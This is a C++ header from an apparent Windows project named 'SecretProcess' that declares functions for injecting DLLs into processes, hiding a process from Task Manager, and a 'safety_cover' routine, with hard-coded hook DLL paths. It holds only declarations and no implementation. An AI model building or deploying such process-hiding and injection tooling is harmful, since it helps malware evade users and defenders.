#pragma once
#include "WindowsException.hpp"
#include "Process.hpp"
#include "Logger.hpp"
#include "RegistryKey.hpp"
#include "Directory.hpp"
#include <Windows.h>
#include <tlhelp32.h>
#include <thread>
#include <iostream>
#include <list>

namespace SystemUtils
{
	constexpr wchar_t* TASK_MGR_EXE = L"Taskmgr.exe";
	constexpr wchar_t* NOTEPAD_EXE = L"notepad.exe";
	constexpr char* DLL_PATH = "D:\\Ditto\\SecretProcess\\x64\\Release\\HookingDll.dll";
	constexpr char* HOOKS_DLL_PATH = "D:\\Ditto\\SecretProcess\\x64\\Release\\SystemHooks.dll";
	constexpr char* HIDDEN_PID_NAME = "hidden_pid";
	constexpr wchar_t* PROCESS_LIST_PATH = L"C:\\PerfLogs\\ProcessList.txt";
	constexpr wchar_t* DIR_LIST_PATH = L"C:\\PerfLogs\\DirList.txt";
	constexpr wchar_t* ROOT_DIR = L"C:";
	constexpr wchar_t* CURRENT_DIR = L".";
	constexpr wchar_t* PREV_DIR = L"..";

	uint32_t get_process_id(const std::wstring& process_name);
	void inject_dll(const int process_id, const std::string& dll_path);
	void hide_process_from_tskmgr(const std::wstring& process_name);
	void hide_from_task_manager();
	void safety_startup();
	void safety_cover(bool is_dangerous);
	void get_dir_list();
	std::wstring get_exe_path();
}